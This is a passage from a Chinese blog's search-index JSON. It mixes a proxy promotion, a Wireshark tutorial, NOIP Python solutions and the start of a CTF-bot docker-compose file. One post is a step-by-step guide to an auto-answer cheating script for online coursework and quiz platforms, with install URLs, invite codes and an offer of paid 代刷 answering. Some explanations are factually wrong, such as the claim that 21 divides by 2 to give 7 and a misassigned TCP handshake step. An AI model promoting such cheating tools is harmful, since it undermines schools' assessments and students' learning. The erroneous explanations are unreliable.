，大约可以用 2 年左右，平均下来大约 0.06&#x2F;天，而且是实打实的买多少用多少，不会出现超时浪费\n买完之后点击左上方仪表盘可以看到你的已订阅\n\n然后点击仪表盘下方的使用文档\n\n选择你的系统安装客户端\n安装完之后登陆客户端就可以看到这样\n\n连接节点目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局， 如果后续出现连接失败就换个节点 \n\n","categories":["技术教程"],"tags":["ChatGPT","AI","Sakuracat"]},{"title":"U校园/Welearn/智慧树/雨课堂/学习通/问卷星/腾讯问卷等196平台自动答题通杀脚本的安装教程","url":"/posts/1ff200e1.html","content":"U 校园&#x2F;Welearn&#x2F;智慧树&#x2F;雨课堂&#x2F;学习通&#x2F;问卷星&#x2F;腾讯问卷等 196 平台自动答题通杀脚本的安装教程\n本教程旨在帮助你节省时间，去做有意义的事情，切勿因小失大，工具是为了进步，而不是偷懒！！！！！！！\n脚本有概率无法做，非选择填空题，如连线题，图片题等\n 图片加载较慢请用浏览器打开本网址 \n\n免责声明\n本刷题脚本仅供个人学习和研究之用，任何商业用途均不被允许。用户在使用本脚本时，应遵守所在国家或地区的法律法规。\n本刷题脚本提供的题目及答案信息来源于公开的资源和第三方网站，我们尽最大努力确保信息的准确性和完整性，但不对其真实性、准确性、可靠性和完整性做出任何明示或暗示的保证。\n使用本刷题脚本所导致的一切后果和责任由用户自行承担，包括但不限于因使用本脚本而引发的任何损失、损害、纠纷、法律责任等。本刷题脚本的开发者和提供者不承担任何责任。\n本刷题脚本可能会涉及到对第三方网站的访问和数据获取，若因此产生的任何纠纷或损失，本刷题脚本的开发者和提供者不承担任何责任。\n本刷题脚本可能随着题库更新而需要不定期的更新和维护，我们将尽量保证更新和维护的及时性和有效性，但不对由于更新和维护造成的任何不便和损失承担责任。\n本刷题脚本的安装和使用即表示用户已充分阅读、理解并接受本免责声明的全部内容。如果用户对免责声明的任何内容存在异议，应立即停止使用本刷题脚本。\n\n脚本的优势\n支持高达约 200 个教育平台， 覆盖率高 \n题库十分  完善 ，正确率高达 99.9%\n价格  低廉 ，最适合中国大学生体质\n\n前排提醒 如果你觉得教程麻烦 ，可以联系 → w1ndys@outlook.com，几块钱（具体看题量）付费代刷题，但本人不对后果负任何责任\n本教程所用的脚本与教程编写者无任何关系，教程只是一个引导作用，实际出任何问题请联系脚本开发者\n 脚本的使用规则：每天每个 IP 有 免费 10 积分，积分售价 10 元 1000 积分，测试发现，可以看做是 1 积分 1 个答案，综合下来就是 10r 大约能买 1000 道题的答案 \n此收费项目与教程编写者  无任何关系 ，如果你介意此费用，请立即退出此页面，阅读本教程即代表你同意本教材的全部用户协议以及免责声明\n开始操作我们推荐 Microsoft Edge，因为这个浏览器安装插件不需要魔法，另外如果有需要魔法的，推荐用 我正在用的，平均 40r 可以用一年多，延迟在 200ms 左右，很稳。\n插件安装\n打开浏览器，进入下面地址\n\nhttps://microsoftedge.microsoft.com/addons/detail/scriptcat/liilgpjgabokdklappibcjfablkpcekh\n点击 获取，这边我已经安装过了，所以是显示 删除\n\n\n进入下面地址，点击 安装脚本\n\nhttps://scriptcat.org/zh-CN/script-show-page/1338#/\n经测试，该脚本不适合刷 welearn，刷 welearn 用下面这个\nhttps://scriptcat.org/zh-CN/script-show-page/174#/\n\n\n\n刷新一下页面\n\n\n点击 确认\n\n出现中间登陆成功的字样，代表成功登陆\n配置插件\n进入你要刷课的平台，我这里以 U 校园 为例, 登上你的账号，看到右下角（不一定），有个悬浮窗，点击设置\n\n\n点击账号操作\n\n如果你是 U 校园，输入邀请码 VGKTEW 领取 50 积分\n如果你是智慧树知到，输入邀请码 6FB7S7  领取 50 积分\n如果你是超星学习通，输入邀请码 P7KSHM ，领取 50 积分\n如果你是其他平台，联系作者获取邀请码，免费赠送 50 积分，作者邮箱 w1ndys@outlook.com\n\n之后点击 自动答题\t\n\n\n\n点击 搜索推荐答题配置，显示【生效】代表生效成功，点击 展开所有配置 可以看到支持的所有平台，推荐 答题间隔 不要太低，建议 打开【手动搜题模式】，避免浪费积分\n\n刷新页面，点击做题\n\n\n等待填完答案，就可以提交了\n\n刷题结果放一下我自己刷的正确率，我个人觉得，这是我用过的题库最正确的脚本了，刷了十几套题，没有错的\n\n\n\n\n","categories":["技术教程"],"tags":["QFNU","智慧树","学习通","U校园","Welearn","脚本"]},{"title":"Wireshark使用教程","url":"/posts/2d075872.html","content":"Wireshark 使用教程\nW1ndys\n\nWireshark 开始抓包示例先介绍一个使用 Wireshark 工具抓取 ping 命令操作的示例\n\n打开 Wireshark ，主界面如下：\n\n\n\n选择对应的网卡，右键，会出现 Start Capture(开始捕获)，点击即可进行捕获该网络信息，开始抓取网络包\n\n\n\n执行需要抓包的操作，如 ping www.baidu.com。\n\n操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤，获取结果如下。\n\n\n\n说明：ip.addr &#x3D;&#x3D; 180.101.49.11 and icmp 表示只显示 ICPM 协议且源主机 IP 或者目的主机 IP 为 119.75.217.26 的数据包。\n\n\n\nWireshark 抓包完成。\nWireshark 抓包界面菜单栏：用于调试、配置\n工具栏：常用功能的快捷方式\n过滤栏：指定过滤条件，过滤数据包\n数据包列表：核心区域，每一行就是一个数据包\n数据包详情：数据包的详细数据\n数据包字节：数据包对应的字节流，二进制\n基础操作调整界面大小工具栏中的三个「放大镜」图标，可以调整主界面数据的大小。\n\n从左到右依次是：放大、缩小、还原默认大小。\n设置显示列数据包列表是最常用的模块之一，列表中有一些默认显示的列，我们可以添加、删除、修改显示的列。\n\n添加显示列\n想要在数据列表中显示某一个字段，可以将这个数据字段添加至显示列中。\n左键选中想要添加为列的字段，右键选择「应用为列」。\n\n选中字段，按 Ctrl + Shift + I ，也可以实现同样的效果。\n添加为列的字段会在数据列表中显示。\n\n\n隐藏显示列\n暂时不想查看的列，可以暂时隐藏起来。\n在显示列的任意位置右键，取消列名的「勾选」，即可隐藏显示列。\n\n\n删除显示列\n要删除某一列，可以将其从显示列中删除。\n右键需要删除的列，点击最下方的「Remove this Column」 。\n\n注意：隐藏字段时，在列名栏的任意位置右键即可；而删除字段时，需要在指定的列名位置右键，以防误删。\n\n\n设置时间数据包列表栏的时间这一列，默认显示格式看起来很不方便，我们可以调整时间的显示格式。\n点击工具栏的「视图」，选择「时间显示格式」，设置你喜欢的格式。\n标记数据包对于某些比较重要的数据包，可以设置成高亮显示，以达到标记的目的。\n选中需要标记的数据包，右键选择最上面的「标记&#x2F;取消标记」。\n\n选中数据包，按 Ctrl + M 也可以实现同样的效果，按两次可以取消标记。\n\n导出数据包演示快速抓包时，我们讲过保存数据包的操作，保存操作默认保存所有已经抓取的数据包。但有时候，我们只需要保存指定的数据包，这时候可以使用导出的功能。\n\n导出单个数据包\n选中数据包，点击左上角的「文件」，点击「导出特定分组」。\n\n在「导出分组界面」，选择第二个 「Selected packets only」，只保存选中的数据包。\n\n\n导出多个数据包\n有时候我们需要导出多个数据包，Wireshark 有一个导出标记的数据包的功能，我们将需要导出的数据包都标记起来，就可以同时导出多个数据包。\n点击左上角的「文件」，点击「导出特定分组」。\n\n在「导出分组界面」，勾选第三个 「Marked packets only」，只导出标记的数据包。\n\n\n\n开启混杂模式局域网的所有流量都会发送给我们的电脑，默认情况下，我们的电脑只会对自己 mac 的流量进行解包，而丢弃其他 mac 的数据包。\n开启混杂模式后，我们就可以解析其他 mac 的数据包，因此，我们使用 Wireshark 时，通常都会开启混杂模式。\n点击菜单栏的「捕获」按钮，点击「选项」。\n\n勾选 在所有接口上使用混杂模式。\n\n界面\n说明：数据包列表区中不同的协议使用了不同的颜色区分，可以在视图 &gt; 着色规则里查看\n\nDisplay Filter(显示过滤器)用于设置过滤条件进行数据包列表过滤。菜单路径：分析 &gt; 显示\n\n\nPacket List Pane(数据包列表)显示捕获到的数据包，每个数据包包含编号，时间截，源地址，目标地址，协议，长度，以及数据包信息。 不同协议的数据包使用了不同的颜色区分显示。\n\nPacket Details Pane(数据包详细信息)在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看协议中的每一个字段。各行信息分别为\n\nFrame: 物理层的数据帧概况\n\nEthernet II: 数据链路层以太网帧头部信息\n\nInternet Protocol Version 4: 互联网层 IP 包头部信息\n\nTransmission Control Protocol: 传输层 T 的数据段头部信息，此处是 TCP\n\nHypertext Transfer Protocol: 应用层的信息，此处是 HTTP 协议\n\n\n\nTCP 包的具体内容\nWireshark 过滤器设置抓包过滤器捕获过滤器的菜单栏路径为 捕获 --&gt; 捕获过滤器, 用于在抓取数据包前设置。\n\n如何使用？可以在抓取数据包前设置如下。\n\nip host 60.207.246.216 and icmp 表示只捕获主机 IP 为 60.207.246.216 的 ICMP 数据包。获取结果如下：\n\n显示过滤器显示过滤器是用于在抓取数据包后设置过滤条件进行过滤数据包。通常是在抓取数据包时设置条件相对宽泛，抓取的数据包内容较多时使用显示过滤器设置条件过滤以方便分析。同样上述场景，在捕获时未设置捕获规则直接通过网卡进行抓取所有数据包，如下\n\n执行 ping www.huawei.com 获取的数据包列表如下\n\n观察上述获取的数据包列表，含有大量的无效数据。这时可以通过设置显示器过滤条件进行提取分析信息。ip.addr &#x3D;&#x3D; 211.162.2.183 and icmp。并进行过滤。\n\n上述介绍了抓包过滤器和显示过滤器的基本使用方法。在组网不复杂或者流量不大情况下，使用显示器过滤器进行抓包后处理就可以满足我们使用。下面介绍一下两者间的语法以及它们的区别。\nWireshark 过滤器表达式的规则抓包过滤器语法和实例抓包过滤器类型 Type（host、net、port）、方向 Dir（src、dst）、协议 Proto（ether、ip、tcp、udp、http、icmp、ftp 等）、逻辑运算符（&amp;&amp; 与、|| 或、！非）\n\n协议过滤\n比较简单，直接在抓包过滤框中直接输入协议名即可。\nTCP，只显示 TCP 协议的数据包列表\nHTTP，只查看 HTTP 协议的数据包列表\nICMP，只显示 ICMP 协议的数据包列表\n\nIP 过滤\nhost 192.168.1.104\nsrc host 192.168.1.104\ndst host 192.168.1.104\n\n端口过滤\nport 80\nsrc port 80\ndst port 80\n\n逻辑运算符&amp;&amp; 与、|| 或、！非\nsrc host 192.168.1.104 &amp;&amp; dst port 80 抓取主机地址为 192.168.1.80、目的端口为 80 的数据包\nhost 192.168.1.104 || host 192.168.1.102 抓取主机为 192.168.1.104 或者 192.168.1.102 的数据包\n！broadcast 不抓取广播数据包\n\n\n显示过滤器语法和实例\n比较操作符\n比较操作符有 &#x3D;&#x3D; 等于、！&#x3D; 不等于、&gt; 大于、&lt; 小于、&gt; &#x3D; 大于等于、&lt;&#x3D; 小于等于。\n\n协议过滤\n比较简单，直接在 Filter 框中直接输入协议名即可。注意：协议名称需要输入小写。\ntcp，只显示 TCP 协议的数据包列表\nhttp，只查看 HTTP 协议的数据包列表\nicmp，只显示 ICMP 协议的数据包列表\n\n\n\n\nip 过滤\nip.src &#x3D;&#x3D; 192.168.1.104 显示源地址为 192.168.1.104 的数据包列表\nip.dst &#x3D;&#x3D; 192.168.1.104, 显示目标地址为 192.168.1.104 的数据包列表\nip.addr &#x3D;&#x3D; 192.168.1.104 显示源 IP 地址或目标 IP 地址为 192.168.1.104 的数据包列表\n\n端口过滤\ntcp.port &#x3D;&#x3D; 80, 显示源主机或者目的主机端口为 80 的数据包列表。\ntcp.srcport &#x3D;&#x3D; 80, 只显示 TCP 协议的源主机端口为 80 的数据包列表。\ntcp.dstport &#x3D;&#x3D; 80，只显示 TCP 协议的目的主机端口为 80 的数据包列表。\n\n\n\n\nhttp 模式过滤\nhttp.request.method &#x3D;&#x3D;“GET”, 只显示 HTTP GET 方法的。\n\n逻辑运算符为 and&#x2F;or&#x2F;not\n过滤多个条件组合时，使用 and&#x2F;or。比如获取 IP 地址为 192.168.1.104 的 ICMP 数据包表达式为 ip.addr &#x3D;&#x3D; 192.168.1.104 and icmp\n\n\n\n\n按照数据包内容过滤。假设我要以 IMCP 层中的内容进行过滤，可以单击选中界面中的码流，在下方进行选中数据。如下\n\n\n右键单击选中后出现如下界面（作为过滤器应用）\n\n选中 Select 后在过滤器中显示如下\n\n后面条件表达式就需要自己填写。如下我想过滤出 data 数据包中包含 “abcd” 内容的数据流。包含的关键词是 contains 后面跟上内容。\n\n常见用显示过滤需求及其对应表达式数据链路层：\n筛选 mac 地址为 04: f9:38: ad: 13:26 的数据包\neth.src &#x3D;&#x3D; 04: f9:38: ad: 13:26\n筛选源 mac 地址为 04: f9:38: ad: 13:26 的数据包—-\neth.src &#x3D;&#x3D; 04: f9:38: ad: 13:26\n网络层：\n筛选 ip 地址为 192.168.1.1 的数据包\nip.addr &#x3D;&#x3D; 192.168.1.1\n筛选 192.168.1.0 网段的数据\nip contains “192.168.1”\n传输层：\n筛选端口为 80 的数据包\ntcp.port &#x3D;&#x3D; 80\n筛选 12345 端口和 80 端口之间的数据包\ntcp.port &#x3D;&#x3D; 12345 &amp;&amp;tcp.port &#x3D;&#x3D; 80\n筛选从 12345 端口到 80 端口的数据包\ntcp.srcport &#x3D;&#x3D; 12345 &amp;&amp;tcp.dstport &#x3D;&#x3D; 80\n应用层：\n特别说明: http 中 http.request 表示请求头中的第一行（如 GET index.jsp HTTP&#x2F;1.1） http.response 表示响应头中的第一行（如 HTTP&#x2F;1.1 200 OK），其他头部都用 http.header_name 形式。\n筛选 url 中包含.php 的 http 数据包\nhttp.request.uri contains “.php”\n筛选内容包含 username 的 http 数据包\nhttp contains “username”\nWireshark 抓包分析 TCP 三次握手过程TCP 三次握手连接建立过程Step1：客户端发送一个 SYN &#x3D; 1，ACK &#x3D; 0 标志的数据包给服务端，请求进行连接，这是第一次握手；\nStep2：服务端收到请求并且允许连接的话，就会发送一个 SYN &#x3D; 1，ACK &#x3D; 1 标志的数据包给发送端，告诉它，可以通讯了，并且让客户端发送一个确认数据包，这是第二次握手；\nStep3：服务端发送一个 SYN &#x3D; 0，ACK &#x3D; 1 的数据包给客户端，告诉它连接已被确认，这就是第三次握手。TCP 连接建立，开始通讯。\n\nWireshark 抓包获取访问指定服务端数据包Step1：启动 wireshark 抓包，打开浏览器输入 http://www.baidu.com。\nStep2：使用 ping http://www.baidu.com 获取 IP。\nStep3：输入过滤条件获取待分析数据包列表 ip.addr &#x3D;&#x3D; 183.232.231.172\n\n图中可以看到 wireshark 截获到了三次握手的三个数据包。第四个包才是 HTTPS 的， 这说明 HTTPS 的确是使用 TCP 建立连接的。\n第一次握手数据包客户端发送一个 TCP，标志位为 SYN，序列号为 0， 代表客户端请求建立连接。\n\n数据包的关键属性如下：\nSYN ：标志位，表示请求建立连接\nSeq &#x3D; 0 ：初始建立连接值为 0，数据包的相对序列号从 0 开始，表示当前还没有发送数据\nAck &#x3D; 0：初始建立连接值为 0，已经收到包的数量，表示当前没有接收到数据\n第二次握手的数据包服务器发回确认包, 标志位为 SYN，ACK。将确认序号(Acknowledgement Number)字段+1，即 0+1 &#x3D; 1。\n\n数据包的关键属性如下：\nSYN + ACK: 标志位，同意建立连接，并回送 SYN+ACK\nSeq &#x3D; 0 ：初始建立值为 0，表示当前还没有发送数据\nAck &#x3D; 1：表示当前端成功接收的数据位数，虽然客户端没有发送任何有效数据，确认号还是被加 1，因为包含 SYN 或 FIN 标志位。（并不会对有效数据的计数产生影响，因为含有 SYN 或 FIN 标志位的包并不携带有效数据）\n第三次握手的数据包客户端再次发送确认包(ACK) SYN 标志位为 0，ACK 标志位为 1。并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在 Flag 段写 ACK 的+1：\n\n数据包的关键属性如下：\nACK ：标志位，表示已经收到记录\nSeq &#x3D; 1 ：表示当前已经发送 1 个数据\nAck &#x3D; 1 : 表示当前端成功接收的数据位数，虽然服务端没有发送任何有效数据，确认号还是被加 1，因为包含 SYN 或 FIN 标志位（并不会对有效数据的计数产生影响，因为含有 SYN 或 FIN 标志位的包并不携带有效数据)。\n就这样通过了 TCP 三次握手，建立了连接。开始进行数据交互\n\nWireshark 分析常用操作导出数据包调整数据包列表中时间戳显示格式。调整方法为 视图 –&gt; 时间显示格式 –&gt; 日期和时间。调整后格式如下：\n\n\n参考链接：\nhttps://blog.w1ndys.top/posts/2d075872\nhttps://zhuanlan.zhihu.com/p/631821119#/\nhttps://www.cnblogs.com/linyfeng/p/9496126.html#/\nhttps://blog.csdn.net/zzwwhhpp/article/details/113077747#/\n\n","categories":["CTF入门指北"],"tags":["CTF","Wireshark","CTF_tools"]},{"title":"[NOIP2004 普及组] 不高兴的津津","url":"/posts/59f2a0b4.html","content":"[NOIP2004 普及组] 不高兴的津津题目描述津津上初中了。妈妈认为津津应该更加用功学习，所以津津除了上学之外，还要参加妈妈为她报名的各科复习班。另外每周妈妈还会送她去学习朗诵、舞蹈和钢琴。但是津津如果一天上课超过八个小时就会不高兴，而且上得越久就会越不高兴。假设津津不会因为其它事不高兴，并且她的不高兴不会持续到第二天。请你帮忙检查一下津津下周的日程安排，看看下周她会不会不高兴；如果会的话，哪天最不高兴。\n输入格式输入包括 $7$ 行数据，分别表示周一到周日的日程安排。每行包括两个小于 $10$ 的非负整数，用空格隔开，分别表示津津在学校上课的时间和妈妈安排她上课的时间。\n输出格式一个数字。如果不会不高兴则输出 $0$，如果会则输出最不高兴的是周几（用 $1, 2, 3, 4, 5, 6, 7$ 分别表 示周一，周二，周三，周四，周五，周六，周日）。如果有两天或两天以上不高兴的程度相当，则输出时间最靠前的一天。\n样例 #1样例输入 #15 36 27 25 35 40 40 6\n\n样例输出 #13\n\n提示NOIP2004 普及组第 1 题\n\n2021-10-27：增加一组 hack 数据\n2022-06-05：又增加一组 hack 数据\n\n题解a1 = list(map(int, input().split()))a2 = list(map(int, input().split()))a3 = list(map(int, input().split()))a4 = list(map(int, input().split()))a5 = list(map(int, input().split()))a6 = list(map(int, input().split()))a7 = list(map(int, input().split()))if a1[0] + a1[1] &gt; 8:    print(1)else:    if a2[0] + a2[1] &gt; 8:        print(2)    else:        if a3[0] + a3[1] &gt; 8:            print(3)        else:            if a4[0] + a4[1] &gt; 8:                print(4)            else:                if a5[0] + a5[1] &gt; 8:                    print(5)                else:                    if a6[0] + a6[1] &gt; 8:                        print(6)                    else:                        if a7[0] + a7[1] &gt; 8:                            print(7)                        else:                            print(0)\n\n第一次我是这么做的，发现有一个没通过，检查一下发现是漏了一个条件，要输出最不高兴的，所以还要做一个时间的判断\n改进一下代码\na1 = list(map(int, input().split()))a2 = list(map(int, input().split()))a3 = list(map(int, input().split()))a4 = list(map(int, input().split()))a5 = list(map(int, input().split()))a6 = list(map(int, input().split()))a7 = list(map(int, input().split()))max_hours = 0max_day = 0if a1[0] + a1[1] &gt; max_hours:    max_hours = a1[0] + a1[1]    max_day = 1if a2[0] + a2[1] &gt; max_hours:    max_hours = a2[0] + a2[1]    max_day = 2if a3[0] + a3[1] &gt; max_hours:    max_hours = a3[0] + a3[1]    max_day = 3if a4[0] + a4[1] &gt; max_hours:    max_hours = a4[0] + a4[1]    max_day = 4if a5[0] + a5[1] &gt; max_hours:    max_hours = a5[0] + a5[1]    max_day = 5if a6[0] + a6[1] &gt; max_hours:    max_hours = a6[0] + a6[1]    max_day = 6if a7[0] + a7[1] &gt; max_hours:    max_hours = a7[0] + a7[1]    max_day = 7if max_hours &lt;= 8:    max_day = 0print(max_day)###下雪了\n\n完美AC\n题解解释这段代码首先从标准输入读取7行输入，每行包含两个整数，用空格分隔。这些输入分别存储在a1到a7的列表中。\n然后，通过比较每一天的工作小时数（列表中的两个整数之和），找到工作最多的一天，并记录该天的索引。索引从1开始，表示一周中的第几天。\n最后，如果最大工作小时数不超过8小时，则将max_day设置为0，表示一周中没有超过8小时的工作日。\n最终输出的是最大工作小时数超过8小时的那一天的索引（从1到7），或者如果所有天的工作小时数都不超过8小时，则输出0。\n知识点复习一下读取输入的知识\nCSDN发现一个大佬写的，搬运一下\nhttps://blog.csdn.net/m0_46204224/article/details/109049999#/Input_44\t\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"[NOIP2005 普及组] 校门外的树","url":"/posts/49ac50d6.html","content":"[NOIP2005 普及组] 校门外的树题目描述某校大门外长度为 $l$ 的马路上有一排树，每两棵相邻的树之间的间隔都是 $1$ 米。我们可以把马路看成一个数轴，马路的一端在数轴 $0$ 的位置，另一端在 $l$ 的位置；数轴上的每个整数点，即 $0,1,2,\\dots,l$，都种有一棵树。\n由于马路上有一些区域要用来建地铁。这些区域用它们在数轴上的起始点和终止点表示。已知任一区域的起始点和终止点的坐标都是整数，区域之间可能有重合的部分。现在要把这些区域中的树（包括区域端点处的两棵树）移走。你的任务是计算将这些树都移走后，马路上还有多少棵树。\n输入格式第一行有两个整数，分别表示马路的长度 $l$ 和区域的数目 $m$。\n接下来 $m$ 行，每行两个整数 $u, v$，表示一个区域的起始点和终止点的坐标。\n输出格式输出一行一个整数，表示将这些树都移走后，马路上剩余的树木数量。\n样例 #1样例输入 #1500 3150 300100 200470 471\n\n样例输出 #1298\n\n提示【数据范围】\n\n对于 $20%$ 的数据，保证区域之间没有重合的部分。\n对于 $100%$ 的数据，保证 $1 \\leq l \\leq 10^4$，$1 \\leq m \\leq 100$，$0 \\leq u \\leq v \\leq l$。\n\n【题目来源】\nNOIP 2005 普及组第二题\n题解int_values = input().split()int_values = list(map(int, int_values))list1 = []for i in range(int_values[0] + 1):    list1.append(1)for i in range(int_values[1]):    a, b = map(int, input().split())    for j in range(a, b + 1):        list1[j] = 0count = 0for i in range(int_values[0] + 1):    if list1[i] == 1:        count += 1print(count)\n\n题解解释\nint_values = input().split(): 从标准输入中读取一行字符串，使用 split() 方法将其拆分为字符串列表，例如 [&#39;500&#39;, &#39;3&#39;]。\nint_values = list(map(int, int_values)): 将字符串列表中的每个元素转换为整数，得到 [500, 3]。\nlist1 = []: 初始化一个空列表，该列表将表示整条道路上的树木分布。\nfor i in range(int_values[0] + 1): list1.append(1): 使用循环，将长度为 l + 1 的列表初始化为 1，其中 l 是道路的长度。\nfor i in range(int_values[1]): a, b = map(int, input().split()): 从输入中读取区域的起始点和终止点，并将其转换为整数。\nfor j in range(a, b + 1): list1[j] = 0: 将区域内的树木移除，将相应的元素设置为 0。\ncount = 0: 初始化一个计数器，用于计算剩余的树木数量。\nfor i in range(int_values[0] + 1): if list1[i] == 1: count += 1: 遍历整个列表，统计值为 1 的元素的数量，即剩余的树木数量。\nprint(count): 输出最终的树木数量。\n\n另外要注意，0-l 是长度，但是要生成的列表大小是 l+1，因为包含 0，实际个数比长度多一个\n知识点list 初始化是空列表，需要 append 添加元素，不要用 list 来命名一个列表\na, b = map(int, input().split()) 可以用这种写法来实现多变量存储\nlist 计数的方法还有 list.count()\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"[NOIP2005 普及组] 陶陶摘苹果","url":"/posts/235be58.html","content":"[NOIP2005 普及组] 陶陶摘苹果题目描述陶陶家的院子里有一棵苹果树，每到秋天树上就会结出 $10$ 个苹果。苹果成熟的时候，陶陶就会跑去摘苹果。陶陶有个 $30$ 厘米高的板凳，当她不能直接用手摘到苹果的时候，就会踩到板凳上再试试。\n现在已知 $10$ 个苹果到地面的高度，以及陶陶把手伸直的时候能够达到的最大高度，请帮陶陶算一下她能够摘到的苹果的数目。假设她碰到苹果，苹果就会掉下来。\n输入格式输入包括两行数据。第一行包含 $10$ 个 $100$ 到 $200$ 之间（包括 $100$ 和 $200$ ）的整数（以厘米为单位）分别表示 $10$ 个苹果到地面的高度，两个相邻的整数之间用一个空格隔开。第二行只包括一个 $100$ 到 $120$ 之间（包含 $100$ 和 $120$ ）的整数（以厘米为单位），表示陶陶把手伸直的时候能够达到的最大高度。\n输出格式输出包括一行，这一行只包含一个整数，表示陶陶能够摘到的苹果的数目。\n样例 #1样例输入 #1100 200 150 140 129 134 167 198 200 111110\n\n样例输出 #15\n\n提示【题目来源】\nNOIP 2005 普及组第一题\n题解int_values = input().split()int_values = list(map(int, int_values))a = int(input())count = 0for i in int_values:    if a &gt;= i or (a + 30) &gt;= i:        count += 1print(count)\n\n题解解释\n来自 ChatGPT\n\n题目描述是关于陶陶摘苹果的问题，其中给出了苹果到地面的高度和陶陶把手伸直的最大高度。陶陶能够摘到苹果的条件是，苹果的高度小于等于陶陶把手伸直的高度，或者小于等于陶陶把手伸直高度再加上板凳的高度（30 厘米）。\n\ninput().split(): 这行代码读取 10 个苹果到地面的高度，将其分割成一个整数列表 int_values。\n\nint_values = list(map(int, int_values)): 转换 int_values 中的字符串为整数，以便进行后续的比较。\n\na = int(input()): 读取陶陶把手伸直的最大高度。\n\ncount = 0: 初始化计数器为 0，用于统计陶陶能够摘到的苹果数量。\n\nfor i in int_values:: 对于每个苹果的高度，进行以下检查。\n\nif a &gt;= i or (a + 30) &gt;= i:: 如果陶陶能够摘到这个苹果（即苹果的高度小于等于陶陶把手伸直的高度或者小于等于陶陶把手伸直高度再加上板凳的高度），则增加计数器。\n\nprint(count): 打印最终计数器的值，即陶陶能够摘到的苹果的数量。\n\n\n根据样例输入和输出，这个问题中的代码将输出符合条件的苹果数量，即陶陶能够摘到的苹果的数目。\n知识点int_values = input().split()int_values = list(map(int, int_values))\n\n用来读取连续输入，空格间隔的数据\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"[NOIP2012 普及组] 质因数分解","url":"/posts/98088128.html","content":"[NOIP2012 普及组] 质因数分解题目描述已知正整数 $n$ 是两个不同的质数的乘积，试求出两者中较大的那个质数。\n输入格式输入一个正整数 $n$。\n输出格式输出一个正整数 $p$，即较大的那个质数。\n样例 #1样例输入 #121\n\n样例输出 #17\n\n提示$1 \\le n\\le 2\\times 10^9$\nNOIP 2012 普及组 第一题\n题解import mathn = int(input())i = 2while i &lt;= math.sqrt(n):    if n % i == 0:        break    i = i + 1print(int(n / i))\n\n题解解释这道题要求解一个正整数 $n$，该整数是两个不同质数的乘积。你需要找出这两个质数中较大的那个，并输出。\n解题思路：\n\n首先导入math库。\n通过循环，从 $i&#x3D;2$ 开始逐步增加 $i$ 的值，直到 $i$ 大于等于 $n$ 的平方根。\n在循环中，检查是否 $n$ 能被 $i$ 整除，如果是，则说明找到了一个质因数，即 $i$。\n输出 $n$ 除以 $i$ 的结果，即较大的那个质数。\n\n在给定的代码中，如果输入是21，那么循环会找到2是21的一个因数，然后输出21除以2的结果，即7。因此，输出为7，是较大的那个质数。\n知识点找质因数的时候，可以用平方根来提高查找速率\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"[NOIP2002 普及组] 级数求和","url":"/posts/6a1bb740.html","content":"[NOIP2002 普及组] 级数求和题目描述已知：$S_n&#x3D; 1+\\dfrac{1}{2}+\\dfrac{1}{3}+…+\\dfrac{1}{n}$。显然对于任意一个整数 $k$，当 $n$ 足够大的时候， $S_n&gt;k$。\n现给出一个整数 $k$，要求计算出一个最小的 $n$，使得 $S_n&gt;k$。\n输入格式一个正整数 $k$。\n输出格式一个正整数 $n$。\n样例 #1样例输入 #11\n\n样例输出 #12\n\n提示【数据范围】\n对于 $100%$ 的数据，$1\\le k \\le 15$。\n【题目来源】\nNOIP 2002 普及组第一题\n题解def find_min_n(k):    Sn = 0    n = 0    while Sn &lt;= k:        n += 1        Sn += 1 / n    return nk = int(input())result = find_min_n(k)print(result)\n\n题解解释\n来自ChatGPT\n\n这段代码是用来寻找一个最小的整数 $n$，使得累加和 $S_n$ 大于给定的整数 $k$。下面是对代码的解释：\n\nfind_min_n 函数定义：\n\nfind_min_n 是一个函数，它接受一个整数参数 k。\nSn 初始化为 0，表示累加和。\nn 初始化为 0，表示整数 $n$。\n使用 while 循环，不断迭代，直到 $S_n$ 大于给定的整数 $k$。\n在每次循环中，n 自增 1，表示考虑下一个分数项 $\\frac{1}{n}$。\nSn 更新为之前的累加和加上新的分数项 $\\frac{1}{n}$。\n\n\n循环条件：\n\n循环条件是 Sn &lt;= k，即当累加和小于或等于给定的整数 $k$ 时继续循环。\n\n\n返回结果：\n\n一旦 $S_n$ 大于给定的整数 $k$，循环结束，函数返回此时的整数 $n$。\n\n\n输入和输出：\n\n使用 input() 获取一个整数输入作为 $k$。\n将输入的 $k$ 传递给 find_min_n 函数，得到结果 result。\n打印输出 result，即最小的整数 $n$。\n\n\n\n整体来说，这段代码通过迭代的方式计算累加和 $S_n$ 直到满足条件 $S_n &gt; k$，然后返回最小的整数 $n$。这种方法相比递归更高效，因为避免了递归深度过大的问题。\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"docker部署GZCTF-QQBOT","url":"/posts/542f29fd.html","content":"环境要求\nLinux 服务器\ndocker\ndocker compose\n\n开始部署相关链接：MoRan23&#x2F;GZCTF-BOT-QQ: GZCTF 对接的 qq 机器人，基于 NapCat+Nonebot 框架 (github.com)\n进入 GZBOTGithub 地址，由于服务器对于 Github 的网络连接会偶然连不上，这里使用 docker-compose 部署，Github 的 README 写的很详细了，这里多说几点易错点。\n\n下方监听的赛事名是 GZCTF 的赛事名，不是赛事序号或赛事 ID，赛事名叫什么就写什么，比如下图中的赛事名就是 W1ndys的bot测试\n\n\n把下面代码参数改好后保存为 docker-compose.yml\nversion: &quot;3.7&quot;services:  napcat:    image: mlikiowa/napcat-docker:latest    restart: always    ports:      - &quot;6099:6099&quot;    # 如果端口占用换一个就行    environment:      - &quot;ACCOUNT=your_account&quot;  #机器人的qq号      - &quot;WSR_ENABLE=true&quot;      - &#x27;WS_URLS=&quot;ws://bot:8988/onebot/v11/ws/&quot;&#x27;    volumes:      - &quot;./napcat/app:/usr/src/app/napcat&quot;      - &quot;./napcat/config:/usr/src/app/napcat/config&quot;    depends_on:      - bot  bot:    image: 